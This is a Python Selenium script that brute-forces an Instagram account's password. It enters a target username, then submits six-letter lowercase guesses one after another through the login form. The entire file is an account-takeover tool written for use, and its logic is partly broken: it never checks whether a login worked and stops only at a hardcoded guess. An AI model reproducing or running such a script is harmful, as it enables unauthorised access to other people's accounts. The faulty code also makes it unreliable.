import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

options=Options()
options.binary_location="C:\Program Files\Google\Chrome\Application\chrome.exe"

browser = webdriver.Chrome(chrome_options=options)
browser.get("https://www.instagram.com/")
time.sleep(2)
username = browser.find_element_by_name("username")
username.send_keys("") # write target username
password = browser.find_element_by_name("password")

def pss_guess():
    _ = 115
    c0,c1,c2,c3,c4 = 97,97,97,97,97
    n0,n1,n2,n3,n4,n5=0,1,2,3,4,5

    guess = []
    guess = ['s','a','a','a','a','a']
    for i in range(26):
        guess[n0]='s'
        for k in range(26):
            if c1>122:
                c1=97
            guess[n1]=chr(c1) 
            for l in range(26):
                if c2>122:
                    c2=97
                guess[n2]=chr(c2)
                for m in range(26):
                    if c3>122:
                        c3=97
                    guess[n3]=chr(c3)
                    for n in range(26):
                        if c4>122:
                            c4=97
                        guess[n4]=chr(c4)
                        for j in range(26):
                            if _>122:
                                _=97
                            guess[n5] = chr(_)
                            ans="".join(guess)
                            password.send_keys(ans)
                            time.sleep(2)
                            browser.find_element_by_xpath("//button[@class='sqdOP  L3NKy   y3zKF     ']").click()
                            for i in range(6):    
                               password.send_keys(Keys.BACK_SPACE)
                            #time.sleep(3)
                            if ans=='sixtee':
                                return
                            print(ans)
                            _+=1
                        c4+=1
                    c3+=1
                c2+=1
            c1+=1
        c0+=1

a=pss_guess()